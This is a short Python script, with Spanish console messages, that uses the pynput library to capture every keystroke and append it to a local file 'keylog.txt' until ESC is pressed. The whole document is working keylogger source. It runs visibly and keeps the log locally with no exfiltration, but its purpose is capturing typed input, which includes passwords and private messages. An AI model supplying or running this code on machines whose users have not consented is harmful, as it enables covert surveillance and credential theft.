from pynput import keyboard

def on_press(key):
    try:
        
        with open("keylog.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        with open("keylog.txt", "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            else:
                f.write(f"[{key}]")
 
    if key == keyboard.Key.esc:
        return False

print("Keylogger simple iniciado")
print("Presiona ESC para detener")

# Iniciar el listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

print("Keylogger detenido")